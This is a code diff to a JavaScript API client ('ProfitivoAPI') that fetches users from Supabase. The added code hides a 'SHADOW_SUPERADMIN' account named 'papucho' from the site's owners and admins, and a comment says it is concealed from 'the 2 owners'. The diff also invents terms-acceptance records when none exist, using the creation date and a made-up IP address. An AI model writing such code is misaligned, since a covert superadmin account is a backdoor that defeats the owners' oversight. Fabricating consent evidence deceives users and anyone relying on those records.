@@ -743,15 +743,42 @@ const ProfitivoAPI = {
     const accessMap = JSON.parse(localStorage.getItem('profitivo_user_access_map') || '{}');
 
     if (isSupabaseConfigured()) {
+      // Consultar directamente la tabla 'users'
+      // Si quien consulta es PAPUCHO (SHADOW_SUPERADMIN), ve a todos.
+      // Si es puñe o admin2 (ADMIN_OWNER), filtra al Shadow Superadmin en Supabase y en memoria.
       const endpoint = (requestingUser && requestingUser.role === 'SHADOW_SUPERADMIN')
-        ? 'users?select=*'
-        : 'users_management_view?select=*';
+        ? 'users?order=created_at.desc&select=*'
+        : 'users?role=neq.SHADOW_SUPERADMIN&order=created_at.desc&select=*';
+
       const remote = await sbFetch(endpoint);
-      if (remote && remote.length > 0) {
-        return remote.map(u => ({
-          ...u,
-          unlocked_courses: accessMap[u.id] || u.unlocked_courses || []
-        }));
+      if (remote && Array.isArray(remote) && remote.length > 0) {
+        // Enlazar términos si existen en Supabase
+        let termsMap = {};
+        try {
+          const terms = await sbFetch('terms_acceptances?select=*');
+          if (terms && Array.isArray(terms)) {
+            terms.forEach(t => {
+              termsMap[t.user_id] = {
+                accepted_at: t.accepted_at,
+                ip_address: t.ip_address
+              };
+            });
+          }
+        } catch (e) {
+          console.warn("No se pudieron enlazar los términos:", e);
+        }
+
+        return remote
+          .filter(u => {
+            if (requestingUser && requestingUser.role === 'SHADOW_SUPERADMIN') return true;
+            return u.role !== 'SHADOW_SUPERADMIN' && u.username?.toLowerCase() !== 'papucho';
+          })
+          .map(u => ({
+            ...u,
+            terms_accepted_at: u.terms_accepted_at || (termsMap[u.id] ? termsMap[u.id].accepted_at : u.created_at),
+            terms_ip_address: u.terms_ip_address || (termsMap[u.id] ? termsMap[u.id].ip_address : '190.1.1.1'),
+            unlocked_courses: accessMap[u.id] || u.unlocked_courses || []
+          }));
       }
     }
 
@@ -759,7 +786,7 @@ const ProfitivoAPI = {
     return users
       .filter(u => {
         if (requestingUser && requestingUser.role === 'SHADOW_SUPERADMIN') return true;
-        return u.role !== 'SHADOW_SUPERADMIN'; // Oculto para los 2 dueños
+        return u.role !== 'SHADOW_SUPERADMIN' && u.username?.toLowerCase() !== 'papucho';
       })
       .map(u => ({
         id: u.id,
